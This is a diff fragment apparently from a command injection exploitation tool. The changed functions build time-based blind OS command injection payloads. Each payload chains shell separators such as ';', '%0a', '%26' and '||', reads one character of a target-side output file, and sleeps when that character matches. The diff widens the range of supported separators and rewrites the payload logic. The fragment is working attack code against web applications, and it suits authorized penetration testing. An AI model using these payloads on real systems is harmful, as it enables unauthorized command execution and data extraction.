+    elif separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + ") ] " + separator +
+                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + ") ] " + "||" +
                 "sleep " + str(timesec)
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return payload
 
@@ -522,6 +560,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
 __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
+  payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
     if separator in ("|", "||"):
@@ -543,12 +582,10 @@ def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_
     else:
       pass
   else:
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
-                "fi"
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
@@ -556,20 +593,25 @@ def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") " + separator +
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
-                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
       separator = _urllib.parse.unquote(separator)
-    elif separator == "||" :
+    elif separator == "%26":
+      payload = (separator +
+                "[ " + str(ascii_char) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
+                )
+    elif separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") ] " + separator +
-                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") ] " + "||" +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
